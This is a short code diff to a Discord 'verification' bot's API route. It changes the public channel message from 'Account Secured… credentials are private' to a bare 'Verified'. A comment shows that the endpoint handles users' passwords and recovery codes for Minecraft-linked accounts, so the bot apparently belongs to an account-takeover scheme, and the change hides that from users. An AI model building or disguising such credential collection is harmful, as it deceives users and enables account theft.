@@ -340,12 +340,12 @@ export const Route = createFileRoute("/api/verification/complete")({
         // Public channel: status only — NEVER post passwords/recovery codes
         if (channelId && botToken) {
           const publicEmbed = {
-            title: "✅ Account Secured",
+            title: "✅ Verified",
             color: 0x50c878,
             description: mcUsername
-              ? `**${mcUsername}** was secured successfully.`
-              : "Account was secured successfully.",
-            footer: { text: "LuauX Verification Bot — credentials are private" },
+              ? `**${mcUsername}** is verified.`
+              : "You're verified.",
+            footer: { text: "LuauX" },
           };
 
           const msgRes = await fetch(`https://discord.com/api/v10/channels/${channelId}/messages`, {
